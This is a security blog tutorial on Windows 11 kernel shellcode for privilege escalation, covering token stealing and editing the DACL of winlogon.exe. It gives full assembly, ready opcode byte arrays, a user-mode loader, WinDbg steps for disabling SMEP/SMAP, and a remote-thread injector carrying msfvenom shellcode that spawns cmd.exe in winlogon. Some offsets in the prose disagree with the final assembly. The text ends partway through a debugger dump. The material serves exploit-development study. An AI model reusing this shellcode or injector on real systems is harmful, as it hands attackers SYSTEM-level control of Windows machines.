---
title: "Windos Kernel Shellcode"
date: 2025-04-06 11:39:03 +/-0200
categories: [exploit, Windows]
tags: [shellcode]     # TAG names should always be lowercase
---

# Kernel Shellcodes

Let's kick off the blog with the foundation and starting point of all our exploits: the code we want to inject — the shellcode.

For the POCs of these three techniques, we need to load the shellcode into the kernel. To do that, we're going to use a program that allows us to set a breakpoint on an Nt function, so from WinDbg we can manually move the `rip` register to execute the shellcode and also toggle SMEP and SMAP. All of this is done manually since we don’t have an exploit that allows us to build a ROP chain yet — this is mostly conceptual. In future blog posts, we’ll dive deeper into vulnerabilities, and at that point, we’ll be able to do all of this programmatically. But the goal of this post is purely conceptual and theoretical-practical, to cover the three shellcode techniques we’ll be discussing.

Before we begin, full credit for these techniques goes to **Morten Schenk**, the original creator and publisher.

**Important note:  
Unlike userland shellcode, which tends to be multi-purpose, kernel land shellcode is typically focused solely on privilege escalation and obtaining `NT\SYSTEM` status.**

First things first — we’ll need a shellcode loader for the POCs. As I mentioned before, we need a program that will load the shellcode into memory and hand control over to WinDbg so we can run the POC manually. While the program may change slightly between runs, the basic structure looks like this:
```cpp
#include <stdio.h>
#include <windows.h>
#include <ktmw32.h>

#pragma comment(lib,"KtmW32.lib")

char charShellcode[] = {
	// shellcode...
};

int main() {

	printf("\nAllocating Kernel Shellcode...\n");

	// Allocate the mem space (CPL 3)
	PVOID pShellcode = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlSecureZeroMemory(pShellcode, 0x1000);

	memcpy(pShellcode, charShellcode, sizeof(charShellcode));
	
	VirtualLock(pShellcode, 0x1000);

	printf("\n[SHELLCODE ADDRESS] 0x%p\n", pShellcode);
	printf("\nPress <ENTER> to free the memory\n");
	getchar();

	CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);

	return 0;
}
```

Since Windows is known for frequently changing kernel data structures, all upcoming kernel shellcodes will reference data through structure offsets.

We’ll be adapting the shellcodes to match the host version of Windows 11.
```
Nombre de host:                            ДОБРОЕ-УТРО
Nombre del sistema operativo:              Microsoft Windows 11 Pro
Versión del sistema operativo:             10.0.22631 N/D Compilación 22631
Fabricante del sistema operativo:          Microsoft Corporation
```

## Token Stealing
The first technique we’re going to cover is **Token Stealing**, which simply involves replacing the token of the exploited process with the highly privileged `System` token.

In the exploited process, we need to locate the `_EPROCESS` structure, which is the kernel representation of a process object. Like many other Windows structures, `_EPROCESS` is located at a fixed offset from other elements, which are eventually dependent on constants. In our case, the constant is the **`GS`** register, and at offset `0x188`, we can find the `_KTHREAD` of the current process. We’ll save it in the **`r9`** register for later use:
```nasm
mov r9, qword ptr gs:[0x188]
```

Now that we’ve stored the `_KTHREAD` in **`r9`**, we can use it to locate the `_EPROCESS`, which is `0x220` bytes away (**EPROCESS** = **KTHREAD** + ``0x220``):
```
lkd> dt _KTHREAD Process
nt!_KTHREAD
   +0x220 Process : Ptr64 _KPROCES
```

Translated into:
```nasm
mov r9, qword ptr[r9+0x220]
```

Since we want to elevate the privileges of the parent process, we need to find the Process ID of ``cmd.exe``. We also realize that this offset differs from older Windows 10 versions.

![](imgs/blog/1WindowsKernelShellcode/20250218165926.png)
![](imgs/blog/1WindowsKernelShellcode/20250218170003.png)

Theoretically, we should be checking ``conhost.exe``, meaning we should go one layer deeper—our PPID should be ``0x1a8c``.
```
kld> dt _EPROCESS
+0x3e8 InheritedFromUniqueProcessId : Ptr64 Void
```

In nasm:
```nasm
mov r8, qword ptr[r9+0x3e8] ; new offset, previous was 3e0
```

We’ve now saved the PID of `cmd.exe`, but before proceeding, we need to locate its `_EPROCESS` address in memory. If we inspect the current process (`kscldr.exe`), we can see that at offsets `0x2e8` and `0x2f0` we have `UniqueProcessId` and `ActiveProcessLinks`. The latter is a linked list of `_EPROCESS` objects that can be traversed and compared against the `cmd.exe` PID stored in `r8`.
```python
lkd> dx @$cursession.Processes[6076]
  [+0x000] Pcb              [Type: _KPROCESS]
    [+0x2e0] ProcessLock      [Type: _EX_PUSH_LOCK]
    [+0x2e8] UniqueProcessId  : 0x17bc [Type: void *]
    [+0x2f0] ActiveProcessLinks [Type: _LIST_ENTRY]
```

Which results in:
```nasm
mov rax, r9
loop1:
	mov rax, qword ptr [rax + 0x2f0]
	sub rax, 0x2f0
	cmp qword ptr[rax + 0x2e8],r8
	jne loop1
```

Once we've found the `cmd.exe` `_EPROCESS` structure, we can inspect it and find at offset `0x360` the token object:
```
lkd> dx -id 0,0,ffffa88f4ce8e080 -r1 (*((ntkrnlmp!_EPROCESS *)0xffffa88f4ce8e080))
(*((ntkrnlmp!_EPROCESS *)0xffffa88f4ce8e080))                 [Type: _EPROCESS]
    [+0x000] Pcb              [Type: _KPROCESS]
    [+0x2e0] ProcessLock      [Type: _EX_PUSH_LOCK]
    [+0x2e8] UniqueProcessId  : 0x17bc [Type: void *]
    [...]
    [+0x360] Token            [Type: _EX_FAST_REF]
```

Store that in the ``rcx`` register:
```nasm
mov rcx, rax
add rcx, 0x360
```

Now we just need to find the `System` process (PID 4) and extract its token. We loop through the same linked list as before until we find a process with ID 4:
```nasm
mov rax, r9
loop2:
	mov rax, qword ptr [rax +0x2f0].
	sub rax, 0x2f0
	cmp [rax + 0x2e8], 4
	jne loop2
	mov rdx, reax
	add rdx, 0x360
```

Finally, we overwrite the existing `cmd.exe` token (stored in `rcx`) with the System token (stored in `rdx`):
```nasm
mov rdx, qword ptr [rdx]
mov qword ptr [rcx], rdx
ret
```

### Token Stealing Lab
First, let’s create a C program that allocates a usermode buffer. Then, we’ll trigger an NT function from WinDbg with a breakpoint, which allows us to see the buffer in context.
```cpp
#include <stdio.h>
#include <windows.h>
#include <ktmw32.h>

#pragma comment(lib,"KtmW32.lib")

// buffer que vamos a asignar para que el kernel lo ejecute
char charShellcode[] = {
	0x90, 0x65, 0x4C, 0x8B, 0x0C, 0x25, 0x88, 0x01, 0x00, 0x00, 
	0x4D, 0x8B, 0x89, 0x20, 0x02, 0x00, 0x00, 0x4D, 0x8B, 0x81, 
	0x40, 0x05, 0x00, 0x00, 0x4D, 0x8B, 0x89, 0x48, 0x04, 0x00, 
	0x00, 0x49, 0x81, 0xE9, 0x48, 0x04, 0x00, 0x00, 0x4D, 0x8B, 
	0x91, 0x40, 0x04, 0x00, 0x00, 0x4D, 0x39, 0xC2, 0x75, 0xE6, 
	0x4C, 0x89, 0xC8, 0x48, 0x05, 0xB8, 0x04, 0x00, 0x00, 0x4D, 
	0x8B, 0x89, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xE9, 0x48, 
	0x04, 0x00, 0x00, 0x4D, 0x8B, 0x91, 0x40, 0x04, 0x00, 0x00, 
	0x49, 0x83, 0xFA, 0x04, 0x75, 0xE5, 0x4D, 0x8B, 0x89, 0xB8, 
	0x04, 0x00, 0x00, 0x4C, 0x89, 0x08, 0xC3, 0x90, 0x90, 0x90
};

int main() {

	printf("\nAllocating Kernel Shellcode...\n");

	// asignamos el espacio
	PVOID pShellcode = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlSecureZeroMemory(pShellcode, 0x1000);

	memcpy(pShellcode, charShellcode, 100);
	
	VirtualLock(pShellcode, 0x1000);

	printf("\n[SHELLCODE ADDRESS] 0x%p\n", pShellcode);
	printf("\nPress <ENTER> to free the memory\n");
	getchar();

	CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);

	return 0;
}
```
Once the shellcode is written, compile it using nasm:
```
nasm -f bin MyTokenElevate.asm
```

To view the disassembly:
```
ndisasm -b 64 MyTokenElevate
```

Use `HxD` to copy the opcodes into your C program:
![](imgs/blog/1WindowsKernelShellcode/20250219182238.png)

Here is our asm code:
```nasm

section .text
BITS 64

		nop

		mov r9, qword [gs:0x188]			; obtenemos el _KTHREAD
		mov r9, qword [r9 + 0x220]				; obtenemos el _EPROCESS/_KPROCESS
		mov r8, qword [r9 + 0x540]				; get the InheritedFromUniqueProcessId (cmd.exe PID)

		loop1:
			mov r9, qword [r9+0x448]			; go to the flink
			sub r9, 0x448						; back to the start of _EPROCESS
			mov r10, qword [r9+0x440]			; get the UniqueProcessId
			cmp r10, r8							; compare both PIDs
			jne loop1
			
		mov rax, r9								; get the cmd.exe's token
		add rax, 0x4b8							; get the address of _EPROCESS on Token position

		loop2:
			mov r9, qword [r9+0x448]			; go to the flink
			sub r9, 0x448						; go to the _EPROCESS' structure start
			mov r10, qword [r9+0x440]			; Gett the UniqueProcesId
			cmp r10, 4							; compare the process ID with 4
			jne loop2
			
		mov r9, qword [r9+0x4b8]
		mov [rax], r9

		ret

end
```
Here is our binary:
![](imgs/blog/1WindowsKernelShellcode/20250219182801.png)


Once we got the opcode we have to paste it in our UM buffer.
```cpp
...
char charShellcode[] = {
	0x90, 0x65, 0x4C, 0x8B, 0x0C, 0x25, 0x88, 0x01, 0x00, 0x00, 
	0x4D, 0x8B, 0x89, 0x20, 0x02, 0x00, 0x00, 0x4D, 0x8B, 0x81, 
	0x40, 0x05, 0x00, 0x00, 0x4D, 0x8B, 0x89, 0x48, 0x04, 0x00, 
	0x00, 0x49, 0x81, 0xE9, 0x48, 0x04, 0x00, 0x00, 0x4D, 0x8B, 
	0x91, 0x40, 0x04, 0x00, 0x00, 0x4D, 0x39, 0xC2, 0x75, 0xE6, 
	0x4C, 0x89, 0xC8, 0x48, 0x05, 0xB8, 0x04, 0x00, 0x00, 0x4D, 
	0x8B, 0x89, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xE9, 0x48, 
	0x04, 0x00, 0x00, 0x4D, 0x8B, 0x91, 0x40, 0x04, 0x00, 0x00, 
	0x49, 0x83, 0xFA, 0x04, 0x75, 0xE5, 0x4D, 0x8B, 0x89, 0xB8, 
	0x04, 0x00, 0x00, 0x4C, 0x89, 0x08, 0xC3, 0x90, 0x90, 0x90
};
...
```
Now we can execute our program in the VM:
![](imgs/blog/1WindowsKernelShellcode/20250219182511.png)

The buffer address is printed. When we press `<ENTER>`, it triggers the `NtCreateTransaction` syscall—set a breakpoint on that function:
```WinDbg
bp nt!NtCreateTransaction
```

![](imgs/blog/1WindowsKernelShellcode/20250219184021.png)

Once the breakpoint hits, we perform a few key steps:
- Ensure the buffer is visible and intact
- Disable **SMAP** and **SMEP** by modifying **`cr4`**
- Modify **`rip`** to point to the start of our buffer
![](imgs/blog/1WindowsKernelShellcode/20250219184715.png)

![](imgs/blog/1WindowsKernelShellcode/20250219184735.png)
Buffer looks good.

![](imgs/blog/1WindowsKernelShellcode/20250219184829.png)
SMAP and SMEP disabled.

![](imgs/blog/1WindowsKernelShellcode/20250219190531.png)
We update **`rip`**.

Then we step over the shellcode using `p`.
![](imgs/blog/1WindowsKernelShellcode/20250219191610.png)

![](imgs/blog/1WindowsKernelShellcode/20250219180422.png)

![](imgs/blog/1WindowsKernelShellcode/20250219180437.png)

![](imgs/blog/1WindowsKernelShellcode/20250219191949.png)

Finally, disable breakpoints and restore the original `rip` value to return to the previous execution context.

![](imgs/blog/1WindowsKernelShellcode/20250219180446.png)

![](imgs/blog/1WindowsKernelShellcode/20250219180612.png)


## ACL-ACE Editing
Here's our action plan:

1. Locate the `SecurityDescriptor` pointer inside **`winlogon.exe`**
2. Here we should find the **SECURITY_DESCRIPTOR** object which includes a **DACL** with **ACCESS_ALLOWED_ACE**s
3. Modify the SID of the **ACE** to `S-1-5-11` (standard SID for 'logged in users')
4. Overwrite the 'Mandatory Integrity Policy' of the exploited process from the current value of '0', so we can access the handle of **`winlogon`**

### ACL-ACE Editing Lab (24H2 (2024 Update, Germanium)
The goal is to inject shellcode into **`winlogon.exe`** and get a privileged `cmd.exe` out of it. For this, we need two things: load the shellcode and have a process injector.

First, we're going to find the `_EPROCESS` address of our target process, **`winlogon.exe`**:
```windbg
0: kd> !process 0 0 winlogon.exe
PROCESS ffffe7814a54d080
    SessionId: 1  Cid: 033c    Peb: 46af345000  ParentCid: 02b4
    DirBase: 228a3c000  ObjectTable: ffff9e0c91211bc0  HandleCount: 275.
    Image: winlogon.exe
```
the winlogon `_EPROCESS`' is `0xffffe7814a54d080`

- **`_EPROCESS` ≈ `_OBJECT_HEADER + 0x30`** (48 bytes) on **x64**.
- **`_EPROCESS` ≈ `_OBJECT_HEADER + 0x18`** (24 bytes) on **x86**.

The `SecurityDescriptor` is inside the `_OBJECT_HEADER`, and that structure is located immediately before `_EPROCESS`:
```cpp
	//0x38 bytes (sizeof)
struct _OBJECT_HEADER
{
    LONGLONG PointerCount;                                                  //0x0
    union
    {
        LONGLONG HandleCount;                                               //0x8
        VOID* NextToFree;                                                   //0x8
    };
    struct _EX_PUSH_LOCK Lock;                                              //0x10
    UCHAR TypeIndex;                                                        //0x18
    union
    {
        UCHAR TraceFlags;                                                   //0x19
        struct
        {
            UCHAR DbgRefTrace:1;                                            //0x19
            UCHAR DbgTracePermanent:1;                                      //0x19
        };
    };
    UCHAR InfoMask;                                                         //0x1a
    union
    {
        UCHAR Flags;                                                        //0x1b
        struct
        {
            UCHAR NewObject:1;                                              //0x1b
            UCHAR KernelObject:1;                                           //0x1b
            UCHAR KernelOnlyAccess:1;                                       //0x1b
            UCHAR ExclusiveObject:1;                                        //0x1b
            UCHAR PermanentObject:1;                                        //0x1b
            UCHAR DefaultSecurityQuota:1;                                   //0x1b
            UCHAR SingleHandleEntry:1;                                      //0x1b
            UCHAR DeletedInline:1;                                          //0x1b
        };
    };
    ULONG Reserved;                                                         //0x1c
    union
    {
        struct _OBJECT_CREATE_INFORMATION* ObjectCreateInfo;                //0x20
        VOID* QuotaBlockCharged;                                            //0x20
    };
    VOID* SecurityDescriptor;                                               //0x28
    struct _QUAD Body;                                                      //0x30
}; 
```
This structure is 0x30 hex bytes before `_EPROCESS`, and here we can find the `_SECURITY_DESCRIPTOR` structure.

![](imgs/blog/1WindowsKernelShellcode/20250221163054.png)

![](imgs/blog/1WindowsKernelShellcode/20250221163131.png)
Here we have the ``_SECURITY_DESCRIPTOR`` of **``winlogon.exe``**:

```cpp
//0x28 bytes (sizeof)
struct _SECURITY_DESCRIPTOR
{
    UCHAR Revision;                                                         //0x0
    UCHAR Sbz1;                                                             //0x1
    USHORT Control;                                                         //0x2
    VOID* Owner;                                                            //0x8
    VOID* Group;                                                            //0x10
    struct _ACL* Sacl;                                                      //0x18
    struct _ACL* Dacl;                                                      //0x20
}; 
```

- **`UCHAR Revision; // 0x0 (1 byte)`**
    - Indicates the version of the security descriptor.
    - Currently, the most common value is `1`.
- **`UCHAR Sbz1; // 0x1 (1 byte)`**
    - Reserved for future use and should not be modified.
- **`USHORT Control; // 0x2 (2 bytes)`**
    - Contains flags describing the descriptor state.
    - Can indicate if ACLs are present or if the descriptor is auto-generated.
- **`VOID* Owner; // 0x8 (8 bytes on x64)`**
    - Pointer to the **owner** of the object.
    - Usually a SID.
- **`VOID* Group; // 0x10 (8 bytes on x64)`**
    - Pointer to the **group** of the object.
    - Also usually a SID.
- **`struct _ACL* Sacl; // 0x18 (8 bytes on x64)`**
    - Pointer to the **SACL**.
    - Used for auditing and access logging.
- **`struct _ACL* Dacl; // 0x20 (8 bytes on x64)`**
    - Pointer to the **DACL**.
    - Defines user permissions over the object.

What we want to modify is the **DACL**, which specifies the access individual users have to the object, in this case **`winlogon.exe`**. An ACL has the following structure according to MSDN:
```cpp
//0x8 bytes (sizeof)
struct _ACL
{
    UCHAR AclRevision;                                                      //0x0
    UCHAR Sbz1;                                                             //0x1
    USHORT AclSize;                                                         //0x2
    USHORT AceCount;                                                        //0x4
    USHORT Sbz2;                                                            //0x6
}; 
```
What this doesn't mention is that the ACL object is just a header, and the actual content is in the subsequent access-control entries or ACEs. For DACL, there are two ACE types: `ACCESS_ALLOWED_ACE` and `ACCESS_DENIED_ACE`. We're interested in `ACCESS_ALLOWED_ACE`.
![](imgs/blog/1WindowsKernelShellcode/20250221164053.png)

The `ACCESS_ALLOWED_ACE` specifies what permissions a certain SID has via the **ACCESS_MASK**.

To summarize, the `SecurityDescriptor` pointer points to the `SECURITY_DESCRIPTOR` object, which contains a DACL with one or more `ACCESS_ALLOWED_ACE` structures. That’s a lot of structures to walk through, but fortunately, we can dump them all with a WinDbg command: `!sd`, which takes the `SecurityDescriptor` pointer as an argument.
![](imgs/blog/1WindowsKernelShellcode/20250221163131.png)
Our `SecurityDescriptor` is:
`0xffff8585eda43e2f`

![](imgs/blog/1WindowsKernelShellcode/20250221165044.png)
this is a ***fast reference pointer***

What’s a fast reference pointer?
When the kernel handles objects like processes, files, or security descriptors, it typically uses **reference-counted pointers**. These work by increasing a counter whenever a thread uses the object, and decreasing it when done. Once the count hits zero, the object is freed.

This system works well, but has a performance issue on multicore systems:

- Every reference count change needs **synchronization**.
- It often involves **costly atomic operations**.
- Under heavy concurrency, all CPUs may try updating the same counter, creating a bottleneck.

On `x64`, the fast reference is 4 bits, so we need to strip off the lower 4 bits to get the real address (`<address> & ~0xf`):
![](imgs/blog/1WindowsKernelShellcode/20250221174154.png)
Here we have the Security Descriptor of **`winlogon.exe`** represented.

This tells us a lot: the `AceCount` in the DACL is 2 (`0x0` and `0x1`), meaning there are two ACEs, both `ACCESS_ALLOWED_ACE`. One is for **NT AUTHORITY SYSTEM**, and the other is for **BUILTIN Administrators**. It also shows that **SYSTEM** has full privileges over the process.

There are many paths to gain access to **`winlogon.exe`**, but we chose to obtain SYSTEM rights. The idea is to **replace the SYSTEM SID with a low-privilege group**, so any member of that group gets full access to the process.

To do that, we need to find the SID in memory. Going back to the DACL structure, the ACL should be at offset `0x20`, as we can see from WinDbg:
![](imgs/blog/1WindowsKernelShellcode/20250221175023.png)

![](imgs/blog/1WindowsKernelShellcode/20250221175324.png)
Here is the DACL of **`winlogon.exe`**.

Unfortunately, we don't have symbols for `_ACCESS_ALLOWED_ACE`, but we do have the structure, so we can calculate byte offsets up to `SidStart`:
```cpp
typedef struct _ACCESS_ALLOWED_ACE {
  ACE_HEADER  Header;
  ACCESS_MASK Mask;
  ULONG       SidStart;
} ACCESS_ALLOWED_ACE;
```

![](imgs/blog/1WindowsKernelShellcode/20250221180734.png)

```cpp
typedef struct _ACE_HEADER {
  UCHAR  AceType;
  UCHAR  AceFlags;
  USHORT AceSize;
} ACE_HEADER;
```
Here's the `_ACE_HEADER`:
![](imgs/blog/1WindowsKernelShellcode/20250221181003.png)
We see `ACE_HEADER` is 4 bytes.  
`ACCESS_MASK` is a DWORD (4 bytes),  
`SidStart` is a ULONG (also 4 bytes).

So the first 4 bytes in the hexdump are `ACE_HEADER` + `ACCESS_MASK`, and `SidStart` starts at offset +8.

Now let’s do the byte swap in WinDbg:
```cpp
typedef DWORD ACCESS_MASK;
typedef ACCESS_MASK* PACCESS_MASK;
```
como vemos, la estructura `_ACCESS_MASK` tiene un tamaño de 4 bytes

So the first 4 bytes in the hexdump are `ACE_HEADER` + `ACCESS_MASK`, and `SidStart` starts at offset +8.

Now let’s do the byte swap in WinDbg:
![](imgs/blog/1WindowsKernelShellcode/20250221184928.png)
We search for ``0x12``, which corresponds to our SID:
![](imgs/blog/1WindowsKernelShellcode/20250221185241.png)

We dump the hex data and locate `0x12`.  
Note: we add `0x20` to reach the beginning of the DACL, and the data we want is at `0x28`.  
After changing it, we get:
![](imgs/blog/1WindowsKernelShellcode/20250221185526.png)
Now the SID is **Authenticated Users**.

Next, we execute the ProcessInjector to create a remote thread that runs shellcode to spawn `cmd.exe` as a child process:
```cpp
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

// 280 bytes
// EXITFUNC=thread
// msfvenom -p windows/x64/exec CMD=cmd.exe -f raw EXITFUNC=thread
unsigned char pPayload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 
	0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 
	0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 
	0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 
	0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 
	0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 
	0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 
	0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 
	0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 
	0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 
	0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 
	0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 
	0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0,
	0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 
	0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 
	0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 
	0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 
	0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 
	0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x6D, 0x64, 
	0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

bool ProcessEnum(const wchar_t* wcProcess, DWORD *ProcId) {

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("\n[ERROR GETTING \"hSnapshot\"] -> %d\n", GetLastError());
		return false;
	}

	PROCESSENTRY32W ProcEntry = { 0 };

	ProcEntry.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hSnapshot, &ProcEntry)) {
		printf("\n[ERROR at \"Process32FirstW\"] -> %d\n", GetLastError());
		return false;
	}

	do {

		if (lstrcmpW(ProcEntry.szExeFile, wcProcess) == 0) {
			wprintf(L"\n[+] Process found -> \"%s\"\n\t\\__PID -> %d\n", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
			*ProcId = ProcEntry.th32ProcessID;
			break;
		}

	} while (Process32NextW(hSnapshot, &ProcEntry));


	return true;
}

bool RemoteInjection(DWORD dwPid) {

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwPid);
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("\n[ERROR CREATING THE HANDLE TO THE PROCESS] -> %d\n", GetLastError());
		return false;
	}
	printf("\n[HANDLE]\n");

	PVOID pRemoteAddress = VirtualAllocEx(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pRemoteAddress == nullptr) {
		printf("\n[ERROR ALLOCATING THE REMOTE BUFFER] -> %d\n", GetLastError());
		return false;
	}
	printf("\n[BUFFER]\n");

	SIZE_T BytesWritten = 0;
	
	if (!WriteProcessMemory(hProcess, pRemoteAddress, pPayload, 280, nullptr)) {
		printf("\n[ERROR WRITTING THE SHELLCODE INTO THE REMOTE BUFFER] -> %d\n", GetLastError());
		return false;
	}
	printf("\n[SHELLCODE]\n");

	HANDLE CreateThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pRemoteAddress, nullptr, 0, nullptr);

	if (CreateThread == INVALID_HANDLE_VALUE) {
		printf("\n[ERROR CREATING THE REMOTE THREAD] -> %d\n", GetLastError());
		return false;
	}

	WaitForSingleObject(CreateThread, INFINITE);

	VirtualFreeEx(hProcess, pRemoteAddress, 0x1000, MEM_RELEASE);

	CloseHandle(hProcess);
	CloseHandle(CreateThread);

	return true;
}

int main() {

	const wchar_t* wcProcess = L"winlogon.exe";
	DWORD dwPid = 0;

	wprintf(L"\nPress <ENTER> to inject shellcode (cmd.exe) into %s process\n", wcProcess);
	getchar();

	if (!ProcessEnum(wcProcess, &dwPid)) {
		printf("\n[main] error enumerating processes\n");
		return 1;
	}

	if (!RemoteInjection(dwPid)) {
		printf("\n[main] error executing the remote process\n");
		return 1;
	}


	return 0;
}
```
We compile and move it to the target OS.

![](imgs/blog/1WindowsKernelShellcode/20250221191042.png)
We see no effect. That’s because we don’t have permission to open a handle to **`winlogon.exe`**

So we need to change the token
![](imgs/blog/1WindowsKernelShellcode/20250221202100.png)

![](imgs/blog/1WindowsKernelShellcode/20250221202515.png)

Again, since it’s a fast reference, we remove the last 4 bits
![](imgs/blog/1WindowsKernelShellcode/20250221203144.png)
Here’s the `_TOKEN` structure of `ProcessInjector.exe`.

The field we care about is `MandatoryPolicy`:
![](imgs/blog/1WindowsKernelShellcode/20250221203502.png)

![](imgs/blog/1WindowsKernelShellcode/20250221203614.png)
This parameter determines whether our process can interact with higher-integrity ones.

Looking at the `Integrity Level` of **`winlogon.exe`**:
![](imgs/blog/1WindowsKernelShellcode/20250221204335.png)
It’s level 4.

In our process, it’s level 1:
![](imgs/blog/1WindowsKernelShellcode/20250221204437.png)

So we are going to overwrite the `MandatoryPolicy` of `ProcessInjector.exe`:

![](imgs/blog/1WindowsKernelShellcode/20250221204708.png)

![](imgs/blog/1WindowsKernelShellcode/20250221204824.png)
Done

The shellcode needs to:
- Find the `_EPROCESS` of winlogon.exe by iterating through all `_EPROCESS` entries and comparing the first 4 characters ("winl")
- Modify the DACL, switching the SYSTEM SID to `Authenticated Users`
- Iterate over `_EPROCESS` again to modify the token and remove the high-integrity restriction

```python
0: kd> dt nt!_KTHREAD Process
   +0x220 Process : Ptr64 _KPROCESS
```

```nasm
BITS 64

section .text

	nop

	mov r8, qword [gs:0x188]					; Get _KTHREAD Address into r8
	mov r8, qword [r8 + 0x220]					; Get _EPROCESS Address
	mov r8, rcx									; save Exploit process' _EPROCESS structure on rcx
...
```

Now we loop to find the process by name:
```nasm
...
	loop1:
		mov r8, qword [r8 + 0x448]				; move the flink into r8
		sub r8, 0x448							; go back to the start of the struct
		cmp dword [r8+0x5a8], 0x6C6E6977		; compare if it is equal to the first 4 characters "winl" (little endiand so "lniw")
		jnz loop1
...
```

We now have winlogon.exe’s `_EPROCESS` in **`r9`**:
```python
0: kd> dt nt!_OBJECT_HEADER ffffa10df2e79080-30 SecurityDescriptor
   +0x028 SecurityDescriptor : 0xffffdd83`27a4feaf Void
```
![](imgs/blog/1WindowsKernelShellcode/20250222005635.png)
```nasm
...
	sub r8, 0x30								; get the _OBJECT_HEADER of winlogon.exe
	mov r8, [r8 + 0x28]							; move to the SecurityDescriptor parameter
	and r8, 0xfffffffffffffff0					; get the pointer to the object instead the fast reference pointer
	mov byte [r8+0x20+0x28], 0x0b				; _SECURITY_DESCRIPTOR + 0x20 (DACL start) + 0x28 (byte we want to change); 0x12 (SYSTEM) -> 0x0b (Authenticated Users; sid S-1-5-18 (SYSTEM) Full Process Control -> S-1-5-11 Full Process Control (Authenticated Users)
...
```

Now that we've changed the **DACL** of **`winlogon.exe`**, what's left? Allowing our process to have a handle on winlogon.exe
```python
dt nt!_EPROCESS ffffa10df89cd080 Token
   +0x4b8 Token : _EX_FAST_REF
```

```python
0: kd> dt nt!_TOKEN (poi(ffffa10df89cd080+0x4b8)&0xfffffffffffffff0)
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffff36`d5969fff
   +0x030 TokenLock        : 0xffffa10d`f9f72390 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 1
   +0x07c UserAndGroupCount : 0x10
   +0x080 RestrictedSidCount : 0
   +0x084 VariableLength   : 0x234
   +0x088 DynamicCharged   : 0x1000
   +0x08c DynamicAvailable : 0
   +0x090 DefaultOwnerIndex : 0
   +0x098 UserAndGroups    : 0xffffdd83`397d34f0 _SID_AND_ATTRIBUTES
   +0x0a0 RestrictedSids   : (null) 
   +0x0a8 PrimaryGroup     : 0xffffdd83`2eac7560 Void
   +0x0b0 DynamicPart      : 0xffffdd83`2eac7560  -> 0x501
